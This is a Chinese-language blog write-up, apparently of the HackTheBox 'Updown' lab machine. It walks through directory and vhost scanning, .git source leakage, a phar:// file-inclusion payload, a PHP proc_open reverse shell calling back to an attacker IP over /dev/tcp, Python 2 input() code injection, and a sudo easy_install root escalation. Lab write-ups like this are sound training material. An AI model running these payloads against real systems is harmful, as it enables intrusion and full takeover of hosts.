@@ -1,0 +1,424 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>OSCP-Updown | Hustler&#39;s Blog</title>
+  <meta name="author" content="Hustler">
+  
+  <meta name="description" content="Everybody needs love,but hacker dont">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="OSCP-Updown"/>
+  <meta property="og:site_name" content="Hustler&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Hustler&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Hustler&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/archives" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> OSCP-Updown</h1>
+		</div>
+	
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Updown"><a href="#Updown" class="headerlink" title="Updown"></a>Updown</h1><h2 id="来源：HackTheBox"><a href="#来源：HackTheBox" class="headerlink" title="来源：HackTheBox"></a>来源：HackTheBox</h2><h3 id="难度：Medium"><a href="#难度：Medium" class="headerlink" title="难度：Medium"></a>难度：Medium</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-O</span> <span class="token parameter variable">-A</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sS</span> -p- <span class="token number">10.10</span>.11.177
+
+<span class="token comment"># 在vps上对10.10.11.177进行扫描</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>发现目标开启了<code>80,22</code>端口，对应web，ssh服务，访问80端口发现有web服务，并且域名为siteisup.htb，随机在vps和本地添加解析，一番操作无果，甚至还有一个xss的兔子洞，尝试目录扫描：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 使用dirb进行逐级递归扫描</span>
+dirb http://10.10.11.177/ <span class="token parameter variable">-r</span>
+dirb http://10.10.11.177/dev/ <span class="token parameter variable">-r</span>
+
+<span class="token comment"># 官方wp 使用gobuster逐级扫描</span>
+gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://siteisup.htb/ <span class="token parameter variable">-w</span> /usr/share/wordlists/dirb/common.txt
+gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://siteisup.htb/dev <span class="token parameter variable">-w</span> /usr/share/wordlists/dirb/common.txt
+
+<span class="token comment"># ffuf</span>
+ffuf <span class="token parameter variable">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt <span class="token parameter variable">-t</span> <span class="token number">100</span> <span class="token parameter variable">-mc</span> <span class="token number">200,302</span>,301 <span class="token parameter variable">-u</span> http://siteisup.htb/FUZZ
+ffuf <span class="token parameter variable">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt <span class="token parameter variable">-t</span> <span class="token number">100</span> <span class="token parameter variable">-mc</span> <span class="token number">200,302</span>,301 <span class="token parameter variable">-u</span> http://siteisup.htb/dev/FUZZ
+ffuf <span class="token parameter variable">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt <span class="token parameter variable">-t</span> <span class="token number">100</span> <span class="token parameter variable">-mc</span> <span class="token number">200,302</span>,301 <span class="token parameter variable">-u</span> http://siteisup.htb/dev/.FUZZ
+<span class="token comment"># 最后一个是尝试隐藏目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>发现&#x2F;dev&#x2F;.git泄露，使用工具git-dumper来利用（githack居然不行）</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> git-dumper <span class="token comment"># 安装</span>
+
+git-dumper http://siteisup.htb/dev/.git dev
+<span class="token comment"># 最后那个dev是自己取的文件夹名 可以随便填一个</span>
+
+<span class="token comment"># 另一种方法 （这个方法很麻烦故不采用 仅记录wget的用法）</span>
+<span class="token function">wget</span> <span class="token parameter variable">-c</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-np</span> <span class="token parameter variable">-k</span> <span class="token parameter variable">-L</span> <span class="token parameter variable">-p</span> http://siteisup.htb/dev/.git/
+<span class="token comment"># 这样使用wget可以将整个.git递归下载下来</span>
+<span class="token comment"># 然后用GitKraken查看有用的数据</span>
+https://www.gitkraken.com/download<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>使用工具发现有一个.htaccess文件值得注意，查看内容：<br><img src="/images/OSCPupdown/1.JPG"><br>大意是在http头部添加了一个<code>Special-Dev: only4dev</code>的键值对，如果头部没有这个，就不允许访问，尝试带上头部去访问&#x2F;dev路径发现没有变化，这不禁让我们思考，究竟是访问什么才需要带上这个头部呢<br>根据信息搜集的知识点，我们可以尝试爆破一下子域名：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 官方wp ffuf</span>
+ffuf <span class="token parameter variable">-u</span> http://siteisup.htb <span class="token parameter variable">-H</span> <span class="token string">"Host: FUZZ.siteisup.htb"</span> <span class="token parameter variable">-w</span> 
+/root/allinsub.txt
+<span class="token comment"># 先不加任何限制条件地扫描，发现错误的子域名数据包的大小均为1131，随机过滤这个大小在次扫描</span>
+ffuf <span class="token parameter variable">-u</span> http://siteisup.htb <span class="token parameter variable">-H</span> <span class="token string">"Host: FUZZ.siteisup.htb"</span> <span class="token parameter variable">-w</span> 
+/root/allinsub.txt <span class="token parameter variable">-fs</span> <span class="token number">1131</span>
+
+<span class="token comment"># gobuster</span>
+gobuster vhost <span class="token parameter variable">-w</span> /root/allinsub.txt <span class="token parameter variable">-t</span> <span class="token number">50</span> <span class="token parameter variable">-u</span> siteisup.htb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>发现dev.siteisup.htb这个子域，带上上文提到的请求头去访问发现访问成功，是一个可以上传文件，按照文件里面内容逐行检测网址是否在线的网站：<br><img src="/images/OSCPupdown/2.JPG"><br>我们可以利用git泄露的源码进行审计：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"># index.php include文件包含漏洞 伪协议
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span>This is only for developers<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?page=admin<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Admin Panel<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
+ <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+ <span class="token function">define</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"DIRECTACCESS"</span><span class="token punctuation">,</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token variable">$page</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+ <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bin|usr|home|var|etc/i"</span><span class="token punctuation">,</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+ <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+ <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"checker.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+ <span class="token delimiter important">?></span></span>
+ 
+# checker.php 文件上传点
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>...SNIP...</span><span class="token punctuation">></span></span>
+ if($_POST['check'])&#123;
+        # File size must be less than 10kb.
+        if ($_FILES['file']['size'] > 10000) &#123;
+        die("File too large!");
+    &#125;
+        $file = $_FILES['file']['name'];
+        # Check if extension is allowed.
+        $ext = getExtension($file);
+        if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext))&#123;
+                die("Extension not allowed!");
+        &#125;
+  
+        # Create directory to upload our file.
+        $dir = "uploads/".md5(time())."/";
+        if(!is_dir($dir))&#123;
+        mkdir($dir, 0770, true);
+    &#125;
+  
+  # Upload the file.
+        $final_path = $dir.$file;
+        move_uploaded_file($_FILES['file']['tmp_name'], "&#123;$final_path&#125;");
+  # Read the uploaded file.
+        $websites = explode("\n",file_get_contents($final_path));
+        foreach($websites as $site)&#123;
+                $site=trim($site);
+                if(!preg_match("#file://#i",$site) &amp;&amp; !preg_match("#data://#i",$site) 
+&amp;&amp; !preg_match("#ftp://#i",$site))&#123;
+                        $check=isitup($site);
+                        if($check)&#123;
+                                echo "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span>&#123;$site&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>green<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>is up 
+^_^<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span>";
+                        &#125;else&#123;
+                                echo "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span>&#123;$site&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>red<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>seems to be 
+down :(<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span>";
+                        &#125;
+                &#125;else&#123;
+                        echo "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>red<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>Hacking attempt was detected !
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span>";
+                &#125;
+        &#125;
+  
+  # Delete the uploaded file.
+        @unlink($final_path);
+ &#125;
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>...SNIP...</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>经过多次尝试后发现只有使用phar伪协议可以成功，我们先写好一个能输出phpinfo信息的php文件：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>然后将其打包成zip文件，随后将zip文件的后缀改为不在黑名单内的后缀，如txt，例子中我们按照这个办法将one.php打包进了one.zip，然后将one.zip改名为one.txt，随后我们上传该文件，进入网站uploads目录查看路径，如下图：<br><img src="/images/OSCPupdown/3.JPG"><br>随后在index.php的page参数处使用phar伪协议，payload如下：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">index<span class="token operator">.</span>php<span class="token operator">?</span>page<span class="token operator">=</span>phar<span class="token punctuation">:</span><span class="token comment">//uploads/f4ffea0fb8f7269a2cca12cd1b266e58/one.txt/one</span>
+
+<span class="token comment"># 一般来说，我们应该包含的是one.txt里面的one.php（压缩包结构是这样的），但是这里程序会在最后自动加上.php的后缀，所以可以携程one.txt/one</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>成功返回phpinfo信息，马上查看disable_functions信息：<br><img src="/images/OSCPupdown/4.JPG"><br>可以看到，把system等函数禁用了，这里可以用工具查看还可以用什么函数来RCE，工具链接：<a target="_blank" rel="noopener" href="https://github.com/teambi0s/dfunc-bypasser">https://github.com/teambi0s/dfunc-bypasser</a><br>为了让工具能正常使用，我们还需要修改其源码，使其请求带上特殊请求头，具体操作不赘述，照搬官方wp：<br><img src="/images/OSCPupdown/5.JPG"><br>程序告诉我们还可以使用proc_open来RCE，搜索发现此函数跟popen差不多，可以用同一种后门，我们这里让其反弹一个shell：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+ <span class="token variable">$descriptorspec</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
+ <span class="token number">0</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pipe'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// stdin</span>
+ <span class="token number">1</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pipe'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// stdout</span>
+ <span class="token number">2</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pipe'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span> <span class="token comment">// stderr</span>
+ <span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/bin/bash -c '/bin/bash -i >&amp; /dev/tcp/10.10.14.10/1337 0>&amp;1'"</span><span class="token punctuation">;</span>
+ <span class="token variable">$process</span> <span class="token operator">=</span> <span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$descriptorspec</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token delimiter important">?></span></span>
+
+# 遇到popen函数的话，把上面的proc_open换成popen也可以<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>成功接收到www-data的shell，登上去之后<code>sudo -l</code>发现没有sudo权限，马上到&#x2F;home目录下查看，发现有一个developer账户，里面有user.txt文件还有一个名为dev的目录，www-data没有权限读取user.txt，遂即进入dev目录，发现siteisup和siteisup.py两个文件，查看py文件源码：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+ url <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Enter URL here:"</span><span class="token punctuation">)</span>
+ page <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+ <span class="token keyword">if</span> page<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+ <span class="token keyword">print</span> <span class="token string">"Website is up"</span>
+ <span class="token keyword">else</span><span class="token punctuation">:</span>
+ <span class="token keyword">print</span> <span class="token string">"Website is down"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>一眼看出是python2（print函数不用包裹），并且python2中的input函数的工作方式与eval函数相同，会解析执行传入的python代码，所以我们只需要在输入的时候输入恶意python代码即可：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./siteisup  <span class="token comment"># 运行程序</span>
+__import__<span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span>.system<span class="token punctuation">(</span><span class="token string">'/bin/bash'</span><span class="token punctuation">)</span>  <span class="token comment"># 输入payload</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>随后我们便获取了developer的权限，我们可以尝试查看ssh私钥，并尝试利用其来获得一个更好的shell，这里不赘述，照搬wp：<br><img src="/images/OSCPupdown/6.JPG"><br>成功获取user.txt的flag<br>使用<code>sudo -l</code>命令发现我们可以运行easy_install，上<code>https://gtfobins.github.io/</code>这个网站查阅发现有提权方法，这里直接截取wp，不做赘述：<br><img src="/images/OSCPupdown/7.JPG"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">TF</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp <span class="token parameter variable">-d</span><span class="token variable">)</span></span>
+<span class="token builtin class-name">echo</span> <span class="token string">"import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;<span class="token variable"><span class="token variable">$(</span><span class="token function">tty</span><span class="token variable">)</span></span> ><span class="token variable"><span class="token variable">$(</span><span class="token function">tty</span><span class="token variable">)</span></span> 2><span class="token variable"><span class="token variable">$(</span><span class="token function">tty</span><span class="token variable">)</span></span>')"</span> <span class="token operator">></span> 
+<span class="token variable">$TF</span>/setup.py
+<span class="token function">sudo</span> easy_install <span class="token variable">$TF</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>运行后成功提权，在&#x2F;root&#x2F;root.txt中找到第二个flag</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+
+</div>
+
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2025/01/15/OSCP-Busqueda/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2025-01-16 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/靶场练习/">靶场练习<span>10</span></a></li> <li><a href="/categories/靶场练习/OSCP/">OSCP<span>10</span></a></li> <li><a href="/categories/靶场练习/OSCP/HackTheBox/">HackTheBox<span>2</span></a></li> <li><a href="/categories/靶场练习/OSCP/HackTheBox/Medium/">Medium<span>1</span></a></li>
+
+<div class="widget tag">
+  <h3 class="title">All Categories</h3>
+     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SRC%E6%8C%96%E6%8E%98/">SRC挖掘</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA%E9%A1%B9%E7%9B%AE/">个人项目</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/">竞赛</a><span class="category-list-count">24</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/AWD/">AWD</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/">CTF</a><span class="category-list-count">23</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Crypto/">Crypto</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Misc/">Misc</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/PWN/">PWN</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Reverse/">Reverse</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Web/">Web</a><span class="category-list-count">9</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/">速查</a><span class="category-list-count">4</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/CTF/">CTF</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/%E5%8D%9A%E5%AE%A2/">博客</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">靶场练习</a><span class="category-list-count">10</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/">OSCP</a><span class="category-list-count">10</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/HackTheBox/">HackTheBox</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/HackTheBox/Easy/">Easy</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/HackTheBox/Medium/">Medium</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/Vulnhub/">Vulnhub</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/Vulnhub/Easy/">Easy</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/Vulnhub/Intermediate/">Intermediate</a><span class="category-list-count">5</span></li></ul></li></ul></li></ul></li></ul> 
+</div>
+ 
+  </li>
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/OSCP/">OSCP<span>10</span></a></li> <li><a href="/tags/靶场练习/">靶场练习<span>10</span></a></li> <li><a href="/tags/HackTheBox/">HackTheBox<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!-- -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 Hustler's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+<br>
+<p>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <span id="busuanzi_container_site_uv" style="display: inline;">本站总访问量<span id="busuanzi_value_site_uv"></span>次</span>
+</p> </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
